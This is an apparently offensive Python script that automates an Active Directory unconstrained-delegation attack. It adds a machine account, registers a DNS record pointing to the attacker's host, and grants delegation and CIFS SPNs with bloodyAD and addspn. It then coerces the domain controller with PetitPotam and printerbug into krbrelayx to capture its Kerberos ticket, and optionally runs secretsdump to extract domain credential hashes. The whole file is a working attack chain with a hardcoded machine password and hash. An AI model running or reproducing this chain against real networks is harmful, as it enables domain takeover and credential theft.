#!/usr/bin/env python3
# AddSPN, DNStool, AddComputer, BloodyAD, and PetitPotam all need to be within PATH.

import os
import sys
import subprocess
import argparse
from colorama import Fore

# Color definitions
RED = Fore.RED
YELLOW = Fore.YELLOW
GREEN = Fore.GREEN
CYAN = Fore.CYAN
RESET = Fore.RESET

# Argument parser setup
parser = argparse.ArgumentParser(
    description="SeDelegationPrivilege Tool",
    formatter_class=argparse.ArgumentDefaultsHelpFormatter,
)
parser.add_argument("-d", "--DOMAIN", required=True, help="Domain to target")
parser.add_argument("-u", "--USERNAME", required=True, help="Username for authentication")
parser.add_argument("-p", "--PASSWORD", required=True, help="Password for authentication")
parser.add_argument("-D", "--DCIP", required=True, help="Domain Controller IP Address")
parser.add_argument("-l", "--LHOST", required=True, help="Local Host IP Address")
parser.add_argument("-s", "--SECRETS", action="store_true", help="Attempt SecretsDump")
args = parser.parse_args()

# Constants
DOMAIN = args.DOMAIN
USERNAME = args.USERNAME
PASSWORD = args.PASSWORD
DC = args.DCIP
LHOST = args.LHOST
SECRETS = args.SECRETS
M = "OGC"  # Machine Name
MP = "Passw0rd123!#"  # Machine Password
MH = "F6844671F5B7158098EC948ADA56E2B0"  # Machine Hash

def run_command(command, shell=False):
    """Run a shell command and handle errors."""
    try:
        result = subprocess.run(command, shell=shell, text=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"{RED}Error: Command failed with {e}{RESET}")
        sys.exit(1)

def add_computer():
    print(f"{YELLOW}Adding Computer {M} with password {MP}{RESET}")
    command = [
        "addcomputer.py",
        "-dc-ip", DC,
        "-computer-pass", MP,
        "-computer-name", M,
        f"{DOMAIN}/{USERNAME}:{PASSWORD}",
    ]
    run_command(command)

def add_dns():
    print(f"{YELLOW}Getting NetBIOS name{RESET}")
    command = f"nxc smb {DOMAIN} | cut -d ':' -f 2 | cut -d ')' -f 1 > netbiosname.txt"
    run_command(command, shell=True)

    print(f"{YELLOW}Adding DNS Record for {M}{RESET}")
    with open("netbiosname.txt", "r") as f:
        content = f.read().strip()
    command = [
        "dnstool.py",
        "-u", f"{DOMAIN}\\{M}$",
        "-p", MP,
        "-r", f"{M}.{DOMAIN}",
        "-d", LHOST,
        "--action", "add",
        f"{content}.{DOMAIN}",
        "-dns-ip", DC,
    ]
    run_command(command)

def create_spn():
    print(f"{YELLOW}Creating SPN allowed for delegation{RESET}")
    with open("netbiosname.txt", "r") as f:
        content = f.read().strip()

    command1 = [
        "bloodyAD",
        "-u", USERNAME,
        "-d", DOMAIN,
        "-p", PASSWORD,
        "--host", f"{content}.{DOMAIN}",
        "add", "uac", f"{M}$", "-f", "TRUSTED_FOR_DELEGATION",
    ]
    run_command(command1)

    print(f"{YELLOW}Allowing CIFS for service account{RESET}")
    spn_commands = [
        [
            "addspn.py",
            "-u", f"{DOMAIN}\\{USERNAME}",
            "-p", PASSWORD,
            "-s", f"cifs/{M}.{DOMAIN}",
            "-t", f"{M}$",
            "-dc-ip", DC,
            f"{content}.{DOMAIN}",
            "--additional",
        ],
        [
            "addspn.py",
            "-u", f"{DOMAIN}\\{USERNAME}",
            "-p", PASSWORD,
            "-s", f"cifs/{M}.{DOMAIN}",
            "-t", f"{M}$",
            "-dc-ip", DC,
            f"{content}.{DOMAIN}",
        ],
    ]
    for command in spn_commands:
        run_command(command)

def krbx():
    print(f"{YELLOW}Attempting to retrieve Kerberos ticket with PetitPotam{RESET}")
    with open("netbiosname.txt", "r") as f:
        content = f.read().strip()

    input(f"{CYAN}Run: krbrelayx.py -hashes :{MH} -t smb://{content}.{DOMAIN}:445. Press Enter when ready.{RESET}")
    command = [
        "PetitPotam.py",
        "-u", f"{M}$",
        "-p", MP,
        f"{M}.{DOMAIN}",
        DC,
    ]
    print(f"{GREEN}{command}{RESET}")
    run_command(command)
    
    print(f"{YELLOW}Running PrinterBug to make sure everything worked.")
    command = [
        "printerbug.py",
        f"{M}:{MP}@{content}.{DOMAIN}",
        f"{M}.{DOMAIN}",
    ]
    print(f"{GREEN}{command}{RESET}")
    run_command(command)

    input(f"{CYAN}Export KRB5CCNAME (ex: export KRB5CCNAME={content}$@{DOMAIN}_krbtgt@{DOMAIN}.ccache) and press Enter when ready.{RESET}")

def secrets():
    print(f"{YELLOW}Attempting SecretsDump{RESET}")
    with open("netbiosname.txt", "r") as f:
        content = f.read().strip()

    command = [
        "secretsdump.py",
        f"{content}$@{content}.{DOMAIN}",
        "-k",
        "-no-pass",
    ]
    run_command(command)

def main():
    add_computer()
    add_dns()
    create_spn()
    krbx()
    if SECRETS:
        secrets()
    run_command("rm -rf netbiosname.txt", shell=True)

if __name__ == "__main__":
    main()
